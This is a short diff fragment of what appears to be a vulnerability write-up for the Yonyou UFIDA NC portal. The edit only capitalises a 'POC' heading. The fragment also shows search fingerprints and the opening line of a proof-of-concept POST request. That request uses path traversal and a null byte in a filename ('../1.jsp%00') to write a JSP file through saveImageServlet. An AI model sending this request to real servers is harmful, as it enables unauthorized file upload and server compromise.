@@ -7,7 +7,7 @@ icon_hash="1085941792"
 app="用友-UFIDA-NC"
 ```
 
-## poc
+## POC
 ```
 POST /portal/pt/servlet/saveImageServlet/doPost?pageId=login&filename=../1.jsp%00 HTTP/1.1
 Host: 
